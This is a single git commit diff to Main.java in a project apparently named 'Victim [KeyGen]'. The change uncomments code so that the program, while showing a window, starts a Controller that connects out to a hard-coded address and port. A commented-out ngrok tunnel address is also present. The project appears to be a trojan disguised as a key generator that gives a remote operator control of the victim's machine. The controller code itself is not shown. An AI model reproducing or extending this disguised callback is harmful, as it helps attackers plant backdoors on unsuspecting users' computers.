491395e7b663d4546496f210a8d08bfb2ac9705b
hacefresko <victorfrespe@gmail.com>
2020-04-19 01:07:40 +0200

    Update Main.java

--- Victim [KeyGen]/src/launcher/Main.java
+++ Victim [KeyGen]/src/launcher/Main.java
@@ -9,7 +9,7 @@ public class Main {
 	public static void main(String[] args) throws IOException {
 		new MainWindow();
 		//Controller ctrl = new Controller("0.tcp.ngrok.io", 11939);
-		//Controller ctrl = new Controller("192.168.0.159", 5123);
-		//ctrl.run();
+		Controller ctrl = new Controller("192.168.0.159", 5123);
+		ctrl.run();
 	}
 }
